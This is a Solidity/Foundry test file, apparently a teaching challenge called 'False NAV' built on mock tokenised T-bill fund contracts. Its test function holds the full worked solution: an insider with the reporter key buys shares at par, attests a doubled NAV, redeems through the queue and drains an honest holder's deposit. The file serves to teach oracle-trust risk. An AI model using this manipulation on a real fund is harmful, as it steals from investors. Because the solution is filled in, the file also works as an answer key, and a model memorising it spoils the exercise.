// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {MockUSDC} from "../../src/MockUSDC.sol";
import {ComplianceRegistry} from "../../src/ComplianceRegistry.sol";
import {TBillToken} from "../../src/TBillToken.sol";
import {TBillVault} from "../../src/TBillVault.sol";
import {MockPriceFeed} from "../../src/exercises/MockPriceFeed.sol";
import {MockTBillCustodian} from "../../src/exercises/MockTBillCustodian.sol";
import {RedemptionQueue} from "../../src/exercises/RedemptionQueue.sol";

/// @title Challenge — False NAV
/// @notice Plank (b) of the bridge is a single trusted number. Everything downstream — the
///         subscription price, the redemption payout, both invariants — believes it. This
///         challenge hands you that number and asks what it is worth.
///
///         You are a compromised insider: a KYC'd customer who also holds the reporter's key
///         (a leaked signing key, or a bribed operations desk). Alice is an honest holder who
///         did nothing wrong.
///
///         Goal: end the test with more USDC than you started with, at the fund's expense.
///
///         This challenge depends on Ex5 — the redemption queue must be implemented, or the
///         path below reverts at `enqueue`.
contract FalseNavChallenge is Test {
    MockUSDC internal usdc;
    ComplianceRegistry internal compliance;
    MockPriceFeed internal feed;
    TBillToken internal tBill;
    MockTBillCustodian internal custodian;
    TBillVault internal vault;
    RedemptionQueue internal queue;

    address internal admin = address(this);
    address internal alice = makeAddr("alice");
    address internal player = makeAddr("player");

    uint256 internal constant PAR = 1e8;
    uint256 internal constant INITIAL_PLAYER_BALANCE = 1_000e6;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    ////////////////////////////////////////////////////////////////////////
    // Initial setup — do not change
    ////////////////////////////////////////////////////////////////////////
    function setUp() public {
        usdc = new MockUSDC();
        compliance = new ComplianceRegistry(admin);
        feed = new MockPriceFeed(int256(PAR));
        tBill = new TBillToken(admin, compliance);
        custodian = new MockTBillCustodian(admin);
        vault = new TBillVault(usdc, tBill, feed, custodian, admin);
        queue = new RedemptionQueue(vault, tBill, usdc, admin);

        tBill.grantRole(tBill.MINTER_ROLE(), address(vault));
        tBill.grantRole(tBill.MINTER_ROLE(), address(queue));
        custodian.grantRole(custodian.CUSTODIAN_ROLE(), address(vault));
        vault.setQueue(address(queue));

        // You are KYC'd — the compliance gate is not what stops you
        compliance.setWhitelisted(address(queue), true);
        compliance.setWhitelisted(alice, true);
        compliance.setWhitelisted(player, true);

        // ...but you also hold the reporter's key, and the settler's
        vault.grantRole(vault.REPORTER_ROLE(), player);
        queue.grantRole(queue.SETTLER_ROLE(), player);

        // Alice subscribes 1000 USDC at par and does nothing else, ever
        usdc.faucet(alice, 1_000e6);
        vm.startPrank(alice);
        usdc.approve(address(vault), 1_000e6);
        vault.subscribe(1_000e6);
        vm.stopPrank();

        usdc.faucet(player, INITIAL_PLAYER_BALANCE);
    }

    ////////////////////////////////////////////////////////////////////////
    // Initial-state checks — do not change
    ////////////////////////////////////////////////////////////////////////
    function test_assertInitialState() public {
        assertEq(vault.navPerShare(), PAR, "the NAV starts at par");
        assertEq(tBill.balanceOf(alice), 1_000e18, "alice holds 1000 shares");
        assertEq(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE);
        assertEq(vault.reserveBalance(), 1_000e6, "the vault holds alice's cash");

        // the honest holder cannot move the NAV, and neither can a stranger
        vm.prank(alice);
        vm.expectRevert();
        vault.attest(int256(2e8));
    }

    ////////////////////////////////////////////////////////////////////////
    // Write your attack here — this is the only function you need to change
    ////////////////////////////////////////////////////////////////////////
    function test_falseNav() public checkSolvedByPlayer {
        // Hint: the vault trusts navPerShare() for BOTH pricing (subscribe) and paying out
        // (the queue). You can move that number. What is the cheapest path from "I can write
        // the NAV" to "I hold more USDC than I started with"?
        //
        // Remember the queue: to be paid you must first subscribe (for shares), enqueue those
        // shares to lock a payout at today's NAV, and then settle and claim.
        //
        // The route (five calls, no code changed, nothing hacked — a number was typed in):
        //
        //   buy at the honest price, re-mark the book, sell at the dishonest price, and let
        //   the queue pay the difference.

        // 1) Buy shares at the HONEST price (NAV = 1.00): 1000 USDC -> 1000 shares.
        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
        vault.subscribe(INITIAL_PLAYER_BALANCE);

        // 2) Re-mark the book. The player holds REPORTER_ROLE, so one typed-in number
        //    doubles the NAV to 2.00 per share. Nothing off-chain changed; the custodian
        //    still holds nothing. This is the same lie from the opening-minute demo.
        vault.attest(int256(2 * PAR)); // NAV 2.00e8

        // 3) Sell at the DISHONEST price. enqueue() locks the payout at today's (lied) NAV,
        //    so the 1000 shares now claim 2000 USDC: 1000e18 * 2e8 / 1e20 = 2000e6.
        tBill.approve(address(queue), 1_000e18);
        queue.enqueue(1_000e18);

        // 4) Settle out of the vault's buffer. It holds 2000 USDC — Alice's honest 1000 plus
        //    the player's own 1000 — exactly enough to honour the inflated ticket, then claim.
        queue.settle(2_000e6);
        queue.claim();

        // Outcome: the player paid in 1000 and walks away with 2000 (net +1000). The vault's
        // buffer is empty and the queue holds nothing, yet Alice's 1000 shares still read as a
        // 2000-USDC claim on a book that is now empty. The reporter's key became cash.
    }

    ////////////////////////////////////////////////////////////////////////
    // Pass/fail check — do not change
    ////////////////////////////////////////////////////////////////////////
    function _isSolved() private {
        // you must come out ahead...
        assertGt(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE, "the player did not profit");
        // ...and the honest holders must be left short: the fund no longer covers its claims
        assertLt(
            vault.reserveBalance() + usdc.balanceOf(address(queue)),
            vault.totalClaimValue(),
            "the fund is not underwater, so nobody was actually robbed"
        );
    }
}
